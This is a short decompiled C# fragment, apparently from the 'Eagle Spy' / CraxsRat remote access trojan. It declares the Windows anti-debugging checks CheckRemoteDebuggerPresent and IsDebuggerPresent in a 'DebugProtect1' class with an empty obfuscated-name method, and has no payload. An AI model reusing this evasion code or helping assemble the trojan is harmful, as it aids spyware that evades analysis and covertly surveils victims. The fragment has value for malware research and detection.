using System;
using System.Runtime.InteropServices;

namespace Eagle_Spy
{
	// Token: 0x0200003C RID: 60
	internal class DebugProtect1
	{
		// Token: 0x0600042A RID: 1066
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] ref bool isDebuggerPresent);

		// Token: 0x0600042B RID: 1067
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern bool IsDebuggerPresent();

		// Token: 0x0600042C RID: 1068 RVA: 0x00002423 File Offset: 0x00000623
		public static void CraxsRatkfvuiorkenfudpajrsnCraxsRatshrtrthrthdrfxc()
		{
		}
	}
}
